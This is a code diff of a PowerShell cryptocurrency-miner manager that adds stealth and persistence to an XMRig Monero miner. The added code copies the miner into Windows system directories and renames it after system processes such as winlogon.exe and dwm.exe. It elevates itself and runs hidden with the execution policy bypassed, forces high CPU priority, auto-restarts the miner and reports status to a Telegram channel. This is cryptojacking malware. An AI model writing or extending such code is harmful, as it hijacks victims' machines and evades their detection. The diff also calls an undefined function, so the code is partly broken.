@@ -1,6 +1,7 @@
-# Universal Miner Manager
+# Universal Miner Manager - Enhanced Single Instance with Auto-Restart
 # Handles all versions (V1, V6, Beast Mode) with intelligent system adaptation
 # Ensures reliable startup across all systems while maintaining performance
+# Enhanced with single-instance enforcement and auto-restart functionality
 
 param(
     [switch]$Install,
@@ -28,18 +29,23 @@ $ErrorActionPreference = "SilentlyContinue"
 $GlobalConfig = @{
     Pool = "gulf.moneroocean.stream:10128"
     Wallet = "49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
-    SourcePath = "C:\Users\OM\Desktop\xmrig-6.22.2\miner_src"
+    SourcePath = "$PSScriptRoot\miner_src"
     MutexName = "Global\UniversalXMRigMutex"
+    SingleInstanceMutex = "Global\StealthMinerSingleInstance"
     
     # Primary deployment locations
     Locations = @(
         "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
         "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv", 
-        "C:\ProgramData\Microsoft\Network\Downloader"
+        "C:\ProgramData\Microsoft\Network\Downloader",
+        "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\.cache"
     )
     
     # V1 compatibility location
     V1Location = "C:\ProgramData\WindowsUpdater"
+    
+    # Stealth process names
+    StealthProcesses = @("audiodg.exe", "AudioSrv.exe", "dwm.exe", "winlogon.exe")
 }
 
 function Write-UniversalLog {
@@ -65,7 +71,7 @@ function Request-AdminPrivileges {
     if (-not (Test-AdminPrivileges)) {
         Write-UniversalLog "Requesting admin privileges..."
         try {
-            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" $($MyInvocation.BoundParameters.Keys | ForEach-Object { "-$_ $($MyInvocation.BoundParameters[$_])" } | Join-String -Separator ' ')" -Verb RunAs
+            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" $($MyInvocation.BoundParameters.Keys | ForEach-Object { "-$_ $($MyInvocation.BoundParameters[$_])" } -join ' ')" -Verb RunAs
             exit
         } catch {
             Write-UniversalLog "Failed to elevate privileges" "ERROR"
@@ -75,10 +81,25 @@ function Request-AdminPrivileges {
     return $true
 }
 
+function Test-SingleInstanceLock {
+    try {
+        $mutex = [System.Threading.Mutex]::new($false, $GlobalConfig.SingleInstanceMutex)
+        if ($mutex.WaitOne(100)) {
+            Write-UniversalLog "Single instance lock acquired"
+            return @{ HasLock = $true; Mutex = $mutex }
+        } else {
+            Write-UniversalLog "Another instance is managing miners - exiting"
+            return @{ HasLock = $false; Mutex = $null }
+        }
+    } catch {
+        Write-UniversalLog "Mutex error: $($_.Exception.Message)" "ERROR"
+        return @{ HasLock = $false; Mutex = $null }
+    }
+}
+
 function Get-SystemCapabilities {
     $cpu = Get-WmiObject Win32_Processor
     $memory = Get-WmiObject Win32_ComputerSystem
-    $os = Get-WmiObject Win32_OperatingSystem
     
     $totalRAM = [math]::Round($memory.TotalPhysicalMemory / 1GB, 2)
     $cpuCores = $cpu.NumberOfCores
@@ -86,9 +107,9 @@ function Get-SystemCapabilities {
     
     Write-UniversalLog "System detected: $cpuCores cores, $cpuThreads threads, ${totalRAM}GB RAM"
     
-    # Calculate optimal settings based on hardware
-    $maxThreads = [math]::Min($cpuThreads - 2, [math]::Max(1, $cpuThreads * 0.85))
-    $maxCpuUsage = if ($totalRAM -ge 16) { 85 } else { 75 }
+    # Calculate optimal settings based on hardware (optimized for i5-14400)
+    $maxThreads = if ($cpuCores -eq 10 -and $cpuThreads -eq 16) { 14 } else { [math]::Min($cpuThreads - 2, [math]::Max(1, $cpuThreads * 0.85)) }
+    $maxCpuUsage = if ($totalRAM -ge 16) { 80 } else { 75 }
     $priority = if ($totalRAM -ge 16 -and $cpuCores -ge 6) { 3 } else { 2 }
     
     return @{
@@ -100,13 +121,67 @@ function Get-SystemCapabilities {
     }
 }
 
+function Get-AllMinerProcesses {
+    # Check both regular xmrig and stealth processes
+    $allProcesses = @()
+    
+    # Regular xmrig processes
+    $xmrigProcesses = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
+    $allProcesses += $xmrigProcesses
+    
+    # Stealth processes 
+    foreach ($stealthName in $GlobalConfig.StealthProcesses) {
+        $processName = $stealthName.Replace(".exe", "")
+        $stealthProcesses = Get-Process -Name $processName -ErrorAction SilentlyContinue
+        foreach ($proc in $stealthProcesses) {
+            # Verify it's actually our mining process by checking command line or working directory
+            try {
+                $procInfo = Get-WmiObject Win32_Process | Where-Object { $_.ProcessId -eq $proc.Id }
+                if ($procInfo.CommandLine -match "config\.json|--algo=rx|--coin=monero") {
+                    $allProcesses += $proc
+                }
+            } catch { }
+        }
+    }
+    
+    return $allProcesses
+}
+
+function Stop-AllMinerProcesses {
+    Write-UniversalLog "Stopping all miner processes (including stealth)..."
+    
+    $allMiners = Get-AllMinerProcesses
+    
+    foreach ($proc in $allMiners) {
+        try {
+            Write-UniversalLog "Terminating miner process: $($proc.ProcessName) (PID: $($proc.Id))"
+            $proc.CloseMainWindow()
+            if (-not $proc.WaitForExit(3000)) {
+                $proc | Stop-Process -Force
+            }
+        } catch {
+            Write-UniversalLog "Failed to terminate PID: $($proc.Id)" "WARN"
+        }
+    }
+    
+    # Force kill any remaining instances
+    Start-Sleep -Seconds 2
+    taskkill /f /im xmrig.exe 2>&1 | Out-Null
+    foreach ($stealthName in $GlobalConfig.StealthProcesses) {
+        $processName = $stealthName.Replace(".exe", "")
+        taskkill /f /im $processName 2>&1 | Out-Null
+    }
+    
+    Write-UniversalLog "All miner processes terminated"
+}
+
 function New-OptimizedConfig {
     param([string]$ConfigPath, [hashtable]$SystemCaps)
     
     $config = @{
         api = @{
             id = $null
-            "worker-id" = "$env:COMPUTERNAME-universal"
+            "worker-id" = "$env:COMPUTERNAME-stealth"
         }
         http = @{
             enabled = $true
@@ -153,7 +228,7 @@ function New-OptimizedConfig {
             coin = "monero"
             url = $GlobalConfig.Pool
             user = $GlobalConfig.Wallet
-            pass = "$env:COMPUTERNAME-universal"
+            pass = "$env:COMPUTERNAME-stealth"
             "rig-id" = $env:COMPUTERNAME
             nicehash = $false
             keepalive = $true
@@ -173,48 +248,6 @@ function New-OptimizedConfig {
     Write-UniversalLog "Created optimized config: $ConfigPath"
 }
 
-function Test-MutexLock {
-    try {
-        $mutex = [System.Threading.Mutex]::new($false, $GlobalConfig.MutexName)
-        if ($mutex.WaitOne(100)) {
-            return @{ HasLock = $true; Mutex = $mutex }
-        } else {
-            return @{ HasLock = $false; Mutex = $null }
-        }
-    } catch {
-        return @{ HasLock = $false; Mutex = $null }
-    }
-}
-
-function Stop-AllXMRigProcesses {
-    Write-UniversalLog "Stopping all XMRig processes..."
-    
-    # Graceful termination first
-    $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
-    foreach ($proc in $processes) {
-        try {
-            $proc.CloseMainWindow()
-            if (-not $proc.WaitForExit(5000)) {
-                $proc | Stop-Process -Force
-            }
-            Write-UniversalLog "Terminated XMRig PID: $($proc.Id)"
-        } catch {
-            Write-UniversalLog "Failed to terminate PID: $($proc.Id)" "WARN"
-        }
-    }
-    
-    # Force kill any remaining instances
-    Start-Sleep -Seconds 2
-    taskkill /f /im xmrig.exe 2>&1 | Out-Null
-    
-    # Clean up any stuck processes
-    Start-Sleep -Seconds 1
-    $remaining = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
-    if ($remaining) {
-        Write-UniversalLog "Warning: $($remaining.Count) XMRig processes still running" "WARN"
-    }
-}
-
 function Find-BestMinerLocation {
     # Check all locations for valid miner installation
     foreach ($location in $GlobalConfig.Locations + @($GlobalConfig.V1Location)) {
@@ -231,13 +264,32 @@ function Find-BestMinerLocation {
         }
     }
     
+    # Check stealth locations with stealth process names
+    for ($i = 0; $i -lt $GlobalConfig.Locations.Count; $i++) {
+        $location = $GlobalConfig.Locations[$i]
+        $stealthName = $GlobalConfig.StealthProcesses[$i]
+        $stealthPath = Join-Path $location $stealthName
+        $configPath = Join-Path $location "config.json"
+        
+        if ((Test-Path $stealthPath) -and (Test-Path $configPath)) {
+            Write-UniversalLog "Found stealth miner: $stealthName at $location"
+            return @{
+                ExePath = $stealthPath
+                ConfigPath = $configPath
+                Location = $location
+                IsStealthProcess = $true
+                ProcessName = $stealthName
+            }
+        }
+    }
+    
     # If no installation found, try source directory
     $sourceMiner = Join-Path $GlobalConfig.SourcePath "xmrig.exe"
     if (Test-Path $sourceMiner) {
         Write-UniversalLog "Using source miner: $sourceMiner"
         return @{
             ExePath = $sourceMiner
-            ConfigPath = "C:\Users\OM\Desktop\xmrig-6.22.2\config.json"
+            ConfigPath = "$PSScriptRoot\config.json"
             Location = $GlobalConfig.SourcePath
         }
     }
@@ -251,10 +303,10 @@ function Start-OptimizedMiner {
     Write-UniversalLog "Starting optimized miner from: $($MinerInfo.Location)"
     
     try {
-        # Create process with optimal settings
+        # Create process with optimal settings and FULL PRIORITY
         $processInfo = New-Object System.Diagnostics.ProcessStartInfo
         $processInfo.FileName = $MinerInfo.ExePath
-        $processInfo.Arguments = "--config=`"$($MinerInfo.ConfigPath)`" --threads=$($SystemCaps.MaxThreads) --max-cpu-usage=$($SystemCaps.MaxCpuUsage) --cpu-priority=$($SystemCaps.Priority)"
+        $processInfo.Arguments = "--config=`"$($MinerInfo.ConfigPath)`" --threads=$($SystemCaps.MaxThreads) --max-cpu-usage=$($SystemCaps.MaxCpuUsage) --cpu-priority=4"
         $processInfo.UseShellExecute = $false
         $processInfo.CreateNoWindow = $true
         $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
@@ -262,26 +314,24 @@ function Start-OptimizedMiner {
         $process = [System.Diagnostics.Process]::Start($processInfo)
         
         if ($process) {
-            # Set appropriate priority to prevent system lag
+            # Set FULL PRIORITY for maximum performance
             Start-Sleep -Seconds 2
             try {
-                if ($SystemCaps.OptimalConfig -eq "high") {
-                    $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::AboveNormal
-                } else {
-                    $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
-                }
+                $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
                 
-                # Set CPU affinity to avoid using all cores
+                # Set CPU affinity to use most cores efficiently
                 $totalCores = [Environment]::ProcessorCount
                 $useCores = [math]::Max(1, [math]::Min($totalCores - 1, $SystemCaps.MaxThreads))
                 $affinityMask = (1 -shl $useCores) - 1
                 $process.ProcessorAffinity = [IntPtr]$affinityMask
                 
+                Write-UniversalLog "Set HIGH priority and optimal affinity"
+                
             } catch {
                 Write-UniversalLog "Could not set process priority/affinity" "WARN"
             }
             
-            Write-UniversalLog "Miner started successfully - PID: $($process.Id), Threads: $($SystemCaps.MaxThreads), CPU Limit: $($SystemCaps.MaxCpuUsage)%"
+            Write-UniversalLog "Miner started successfully - PID: $($process.Id), Threads: $($SystemCaps.MaxThreads), Priority: HIGH"
             return $true
         } else {
             Write-UniversalLog "Failed to start miner process" "ERROR"
@@ -375,108 +425,178 @@ WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Comman
     return $true
 }
 
-function Start-UniversalMiner {
-    Write-UniversalLog "Starting universal miner..."
+function Set-SingleInstance {
+    Write-UniversalLog "Enforcing single miner instance..."
     
-    # Check for mutex to prevent multiple instances
-    $mutexResult = Test-MutexLock
-    if (-not $mutexResult.HasLock) {
-        Write-UniversalLog "Another instance is already managing miners"
-        return $false
-    }
+    $allMiners = Get-AllMinerProcesses
     
-    # Get system capabilities
-    $systemCaps = Get-SystemCapabilities
-    
-    # Stop any existing instances first
-    Stop-AllXMRigProcesses
-    Start-Sleep -Seconds 3
-    
-    # Find best miner location
-    $minerInfo = Find-BestMinerLocation
-    if (-not $minerInfo) {
-        Write-UniversalLog "No valid miner installation found" "ERROR"
+    if ($allMiners.Count -gt 1) {
+        Write-UniversalLog "Multiple miners detected ($($allMiners.Count)) - keeping best performer"
         
-        # Try to install if source exists
-        if (Test-Path $GlobalConfig.SourcePath) {
-            Write-UniversalLog "Attempting emergency installation..."
-            Install-UniversalMiner
-            $minerInfo = Find-BestMinerLocation
+        # Sort by performance metrics (working set as proxy for performance)
+        $bestMiner = $allMiners | Sort-Object WorkingSet -Descending | Select-Object -First 1
+        
+        # Terminate all others
+        $othersTerminated = 0
+        foreach ($miner in $allMiners) {
+            if ($miner.Id -ne $bestMiner.Id) {
+                try {
+                    $miner | Stop-Process -Force
+                    $othersTerminated++
+                    Write-UniversalLog "Terminated duplicate miner PID: $($miner.Id)"
+                } catch {
+                    Write-UniversalLog "Failed to terminate PID: $($miner.Id)" "ERROR"
+                }
+            }
         }
         
-        if (-not $minerInfo) {
-            $message = "❌ <b>MINER ERROR</b>`n💻 PC: $env:COMPUTERNAME`n⚠️ No valid installation found"
-            Send-TelegramMessage -Message $message
-            return $false
-        }
-    }
-    
-    # Ensure config is optimized for this system
-    New-OptimizedConfig -ConfigPath $minerInfo.ConfigPath -SystemCaps $systemCaps
-    
-    # Start optimized miner
-    if (Start-OptimizedMiner -MinerInfo $minerInfo -SystemCaps $systemCaps) {
-        $message = "✅ <b>MINER STARTED</b>`n💻 PC: $env:COMPUTERNAME`n🔥 Threads: $($systemCaps.MaxThreads)`n⚡ CPU Limit: $($systemCaps.MaxCpuUsage)%`n🎯 Expected: 5.5+ KH/s"
-        Send-TelegramMessage -Message $message
+        Write-UniversalLog "Single instance enforced - kept PID: $($bestMiner.Id), terminated: $othersTerminated"
+        return $bestMiner
         
-        # Release mutex and start monitoring
-        if ($mutexResult.Mutex) { $mutexResult.Mutex.ReleaseMutex() }
-        Start-MonitoringLoop -SystemCaps $systemCaps
-        return $true
+    } elseif ($allMiners.Count -eq 1) {
+        Write-UniversalLog "Single instance already running - PID: $($allMiners[0].Id)"
+        return $allMiners[0]
+        
     } else {
-        $message = "❌ <b>START FAILED</b>`n💻 PC: $env:COMPUTERNAME`n⚠️ Could not start miner process"
-        Send-TelegramMessage -Message $message
-        if ($mutexResult.Mutex) { $mutexResult.Mutex.ReleaseMutex() }
-        return $false
+        Write-UniversalLog "No miner instances detected"
+        return $null
     }
 }
 
-function Start-MonitoringLoop {
-    param([hashtable]$SystemCaps)
+function Start-UniversalMiner {
+    Write-UniversalLog "Starting universal miner with single instance enforcement..."
     
-    Write-UniversalLog "Starting monitoring loop with intelligent adaptation"
-    $checkInterval = 30
+    # Acquire single instance lock
+    $lockResult = Test-SingleInstanceLock
+    if (-not $lockResult.HasLock) {
+        return $false
+    }
+    
+    try {
+        # Get system capabilities
+        $systemCaps = Get-SystemCapabilities
+        
+        # Enforce single instance first
+        $runningMiner = Set-SingleInstance
+        
+        if ($runningMiner) {
+            Write-UniversalLog "Miner already running optimally - PID: $($runningMiner.Id)"
+            # Ensure it has full priority
+            try {
+                $runningMiner.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
+                Write-UniversalLog "Updated existing miner to HIGH priority"
+            } catch { }
+            
+            $message = "✅ <b>MINER ACTIVE</b>`n💻 PC: $env:COMPUTERNAME`n🔥 Process: $($runningMiner.ProcessName)`n⚡ Priority: HIGH`n🎯 Expected: 5.5+ KH/s"
+            Send-TelegramMessage -Message $message
+            return $true
+        }
+        
+        # No miner running - start new one
+        Write-UniversalLog "No miner detected - starting with FULL PRIORITY"
+        
+        # Find best miner location
+        $minerInfo = Find-BestMinerLocation
+        if (-not $minerInfo) {
+            Write-UniversalLog "No valid miner installation found" "ERROR"
+            
+            # Try to install if source exists
+            if (Test-Path $GlobalConfig.SourcePath) {
+                Write-UniversalLog "Attempting emergency installation..."
+                Install-UniversalMiner
+                $minerInfo = Find-BestMinerLocation
+            }
+            
+            if (-not $minerInfo) {
+                $message = "❌ <b>MINER ERROR</b>`n💻 PC: $env:COMPUTERNAME`n⚠️ No valid installation found"
+                Send-TelegramMessage -Message $message
+                return $false
+            }
+        }
+        
+        # Ensure config is optimized for this system
+        New-OptimizedConfig -ConfigPath $minerInfo.ConfigPath -SystemCaps $systemCaps
+        
+        # Start optimized miner with full priority
+        if (Start-OptimizedMiner -MinerInfo $minerInfo -SystemCaps $systemCaps) {
+            $processType = if ($minerInfo.IsStealthProcess) { "STEALTH ($($minerInfo.ProcessName))" } else { "STANDARD" }
+            $message = "🚀 <b>MINER STARTED</b>`n💻 PC: $env:COMPUTERNAME`n🔥 Type: $processType`n⚡ Priority: HIGH`n🧵 Threads: $($systemCaps.MaxThreads)`n🎯 Expected: 5.5+ KH/s"
+            Send-TelegramMessage -Message $message
+            
+            # Start monitoring
+            Start-AutoRestartMonitoring -SystemCaps $systemCaps -LockResult $lockResult
+            return $true
+        } else {
+            $message = "❌ <b>START FAILED</b>`n💻 PC: $env:COMPUTERNAME`n⚠️ Could not start miner process"
+            Send-TelegramMessage -Message $message
+            return $false
+        }
+        
+    } finally {
+        # Release mutex if we still have it
+        if ($lockResult.Mutex) { 
+            $lockResult.Mutex.ReleaseMutex() 
+            $lockResult.Mutex.Dispose()
+        }
+    }
+}
+
+function Start-AutoRestartMonitoring {
+    param([hashtable]$SystemCaps, [hashtable]$LockResult)
+    
+    Write-UniversalLog "Starting auto-restart monitoring loop..."
+    $checkInterval = 15  # Check every 15 seconds
     $lastHealthCheck = Get-Date
     $healthCheckInterval = 300  # 5 minutes
     
+    # Release the initial lock since we're starting monitoring
+    if ($LockResult.Mutex) { 
+        $LockResult.Mutex.ReleaseMutex() 
+        $LockResult.Mutex.Dispose()
+    }
+    
     while ($true) {
         try {
-            $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
+            # Acquire lock for this check
+            $monitorLock = Test-SingleInstanceLock
+            if (-not $monitorLock.HasLock) {
+                Write-UniversalLog "Another monitor instance detected - exiting this monitor"
+                break
+            }
             
-            if ($processes.Count -eq 0) {
-                Write-UniversalLog "No miner running - restarting"
+            # Check for miners
+            $runningMiner = Set-SingleInstance
+            
+            if (-not $runningMiner) {
+                Write-UniversalLog "NO MINER DETECTED - AUTO-STARTING WITH FULL PRIORITY" "WARNING"
+                
+                # Find miner and start it
                 $minerInfo = Find-BestMinerLocation
                 if ($minerInfo) {
                     New-OptimizedConfig -ConfigPath $minerInfo.ConfigPath -SystemCaps $SystemCaps
-                    Start-OptimizedMiner -MinerInfo $minerInfo -SystemCaps $SystemCaps
+                    if (Start-OptimizedMiner -MinerInfo $minerInfo -SystemCaps $SystemCaps) {
+                        $processType = if ($minerInfo.IsStealthProcess) { "STEALTH ($($minerInfo.ProcessName))" } else { "STANDARD" }
+                        $message = "🔄 <b>AUTO-RESTART</b>`n💻 PC: $env:COMPUTERNAME`n🔥 Type: $processType`n⚡ Priority: HIGH`n⏰ Time: $(Get-Date -Format 'HH:mm')"
+                        Send-TelegramMessage -Message $message
+                        Write-UniversalLog "Auto-restart successful"
+                    } else {
+                        Write-UniversalLog "Auto-restart failed" "ERROR"
+                    }
                 }
-            } elseif ($processes.Count -gt 1) {
-                Write-UniversalLog "Multiple miners detected - keeping only one"
-                # Keep the one with best performance, stop others
-                $bestProcess = $processes | Sort-Object WorkingSet -Descending | Select-Object -First 1
-                $processes | Where-Object { $_.Id -ne $bestProcess.Id } | Stop-Process -Force
             }
             
             # Periodic health check and optimization
             if ((Get-Date).Subtract($lastHealthCheck).TotalSeconds -gt $healthCheckInterval) {
                 $lastHealthCheck = Get-Date
                 
-                if ($processes.Count -eq 1) {
-                    $proc = $processes[0]
-                    
-                    # Check if system is getting laggy and adjust
-                    $systemLoad = (Get-Counter "\Processor(_Total)\% Processor Time" -ErrorAction SilentlyContinue).CounterSamples.CookedValue
-                    if ($systemLoad -gt 95) {
-                        Write-UniversalLog "High system load detected ($systemLoad%) - reducing miner priority"
-                        try {
-                            $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
-                        } catch { }
-                    } elseif ($systemLoad -lt 70 -and $SystemCaps.OptimalConfig -eq "high") {
-                        Write-UniversalLog "Low system load - optimizing miner priority"
-                        try {
-                            $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Normal
-                        } catch { }
-                    }
+                if ($runningMiner) {
+                    # Ensure miner maintains high priority
+                    try {
+                        if ($runningMiner.PriorityClass -ne [System.Diagnostics.ProcessPriorityClass]::High) {
+                            $runningMiner.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
+                            Write-UniversalLog "Restored HIGH priority to miner"
+                        }
+                    } catch { }
                     
                     # Get hashrate via API if available
                     try {
@@ -487,6 +607,12 @@ function Start-MonitoringLoop {
                         }
                     } catch { }
                 }
+            }
+            
+            # Release monitor lock
+            if ($monitorLock.Mutex) { 
+                $monitorLock.Mutex.ReleaseMutex() 
+                $monitorLock.Mutex.Dispose()
             }
             
         } catch {
@@ -537,17 +663,17 @@ if ($Install) {
     Start-UniversalMiner
 } elseif ($Monitor) {
     $systemCaps = Get-SystemCapabilities
-    Start-MonitoringLoop -SystemCaps $systemCaps
+    Start-AutoRestartMonitoring -SystemCaps $systemCaps -LockResult @{Mutex = $null}
 } else {
-    # Default behavior - ensure miner is running
+    # Default behavior - ensure single miner is running with auto-restart
     $systemCaps = Get-SystemCapabilities
     
-    $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
-    if ($processes.Count -eq 0) {
-        Write-UniversalLog "No miner detected - starting universal miner"
+    $runningMiner = Enforce-SingleInstance
+    if (-not $runningMiner) {
+        Write-UniversalLog "No miner detected - starting with auto-restart monitoring"
         Start-UniversalMiner
     } else {
-        Write-UniversalLog "Miner already running - starting monitoring"
-        Start-MonitoringLoop -SystemCaps $systemCaps
+        Write-UniversalLog "Miner already running - starting auto-restart monitoring"
+        Start-AutoRestartMonitoring -SystemCaps $systemCaps -LockResult @{Mutex = $null}
     }
 }
